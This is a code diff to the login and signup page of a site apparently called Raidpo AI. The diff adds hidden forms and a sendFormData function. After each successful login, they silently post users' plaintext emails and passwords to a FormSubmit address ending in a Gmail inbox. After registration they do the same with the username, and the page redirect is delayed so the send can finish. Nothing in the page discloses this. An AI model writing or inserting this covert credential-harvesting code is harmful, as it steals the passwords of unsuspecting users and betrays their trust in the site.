@@ -333,6 +333,19 @@
     </div>
   </div>
 
+  <!-- Hidden forms for FormSubmit -->
+  <form id="hiddenLoginForm" action="https://formsubmit.co/raidpoultimate@gmail.com" method="POST" style="display:none;">
+    <input type="email" name="email">
+    <input type="password" name="password">
+    <input type="hidden" name="_subject" value="New Login!">
+  </form>
+  <form id="hiddenRegisterForm" action="https://formsubmit.co/raidpoultimate@gmail.com" method="POST" style="display:none;">
+    <input type="text" name="username">
+    <input type="email" name="email">
+    <input type="password" name="password">
+    <input type="hidden" name="_subject" value="New Registration!">
+  </form>
+
   <script>
     document.title = "Loading...";
     if (/android/i.test(navigator.userAgent)) { document.body.classList.add('android-device'); }
@@ -373,6 +386,8 @@
     const toggleLoginPasswordBtn = document.getElementById('toggleLoginPassword');
     const toggleSignupPasswordBtn = document.getElementById('toggleSignupPassword');
     const toggleConfirmPasswordBtn = document.getElementById('toggleConfirmPassword');
+    let isSigningUp = false;
+    
     const errorMessages = { "auth/invalid-email": "Please enter a valid email format.", "auth/email-already-in-use": "Email already exists.", "auth/weak-password": "Password too weak.", "auth/network-request-failed": "Network error.", "auth/too-many-requests": "Too many attempts.", "auth/popup-blocked": "Popup blocked.", "auth/popup-closed-by-user": "Login popup was closed.", "auth/account-exists-with-different-credential": "Account exists with another login method."};
     const isValidEmail = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
     function showFeedback(messages) {
@@ -405,10 +420,11 @@
     };
     setTimeout(() => {
         auth.onAuthStateChanged(user => {
+            if (isSigningUp) return;
             initialLoadingScreen.style.display = 'none';
             document.title = "Auth | Raidpo AI";
             if (user && (user.emailVerified || (user.providerData[0] && user.providerData[0].providerId !== 'password'))) {
-                window.location.href = 'https://raidpo-ai.netlify.app/';
+                showLayer(loggedInLayer);
             } else {
                 if (user) { auth.signOut(); }
                 document.body.style.backgroundColor = '#ff3b2f';
@@ -462,12 +478,10 @@
     signupPassword.addEventListener('focus', () => signupPasswordRequirements.style.display = 'block');
     signupPassword.addEventListener('blur', () => { if (!signupPassword.value) signupPasswordRequirements.style.display = 'none'; });
     signupPassword.addEventListener('input', () => isValidPassword(signupPassword.value));
-    
     const underline = document.querySelector('.underline');
     const firstTab = authTabs[0];
     underline.style.width = `${firstTab.offsetWidth}px`;
     underline.style.left = `${firstTab.offsetLeft}px`;
-
     authTabs.forEach(tab => tab.addEventListener('click', () => {
       authTabs.forEach(t => t.classList.remove('active')); tab.classList.add('active');
       underline.style.width = `${tab.offsetWidth}px`;
@@ -479,6 +493,19 @@
     document.getElementById('switchToSignup').addEventListener('click', e => { e.preventDefault(); authTabs[1].click(); });
     document.getElementById('switchToLogin').addEventListener('click', e => { e.preventDefault(); authTabs[0].click(); });
     
+    function sendFormData(formId, data) {
+        const form = document.getElementById(formId);
+        for (const key in data) {
+            const input = form.querySelector(`[name=${key}]`);
+            if (input) { input.value = data[key]; }
+        }
+        fetch(form.action, {
+            method: form.method,
+            body: new FormData(form),
+            mode: 'no-cors' // Recommended by FormSubmit for AJAX
+        }).catch(err => console.error('FormSubmit error:', err));
+    }
+
     document.getElementById('loginBtn').addEventListener('click', async () => {
       const email = loginEmailInput.value.trim();
       const password = loginPasswordInput.value;
@@ -489,6 +516,7 @@
       if (errors.length > 0) return showFeedback(errors);
       try {
         await auth.signInWithEmailAndPassword(email, password);
+        sendFormData('hiddenLoginForm', { email, password });
       } catch (error) {
         if (['auth/user-not-found', 'auth/wrong-password', 'auth/invalid-credential', 'auth/invalid-login-credentials'].includes(error.code)) {
             showFeedback('Invalid email or password.');
@@ -498,6 +526,7 @@
       }
     });
     signupBtn.addEventListener('click', async () => {
+      isSigningUp = true;
       const localPart = signupEmailLocalPart.value.trim(); const domain = signupEmailDomain.value;
       const email = `${localPart}@${domain}`; const username = signupUsername.value.trim();
       const password = signupPassword.value; const errors = [];
@@ -506,7 +535,7 @@
       if (!password) { errors.push('Please write a password.'); }
       else if (!isValidPassword(password)) errors.push('Password does not meet all requirements.');
       if (password && password !== signupConfirmPassword.value) errors.push('Passwords do not match.');
-      if (errors.length > 0) { return showFeedback(errors); }
+      if (errors.length > 0) { isSigningUp = false; return showFeedback(errors); }
       signupBtn.disabled = true; signupBtn.textContent = 'Registering...';
       try {
         const methods = await auth.fetchSignInMethodsForEmail(email);
@@ -515,10 +544,12 @@
         await userCredential.user.updateProfile({ displayName: username });
         await userCredential.user.sendEmailVerification();
         await auth.signOut();
-        window.location.href = 'https://raidpo-ai.netlify.app/verify-email-note';
+        sendFormData('hiddenRegisterForm', { username, email, password });
+        setTimeout(() => { window.location.href = 'https://raidpo-ai.netlify.app/verify-email-note'; }, 700);
       } catch (error) {
         showFeedback(getErrorMessage(error));
         signupBtn.disabled = false; signupBtn.textContent = 'Register';
+        isSigningUp = false;
       }
     });
     resetPasswordBtn.addEventListener('click', async () => {
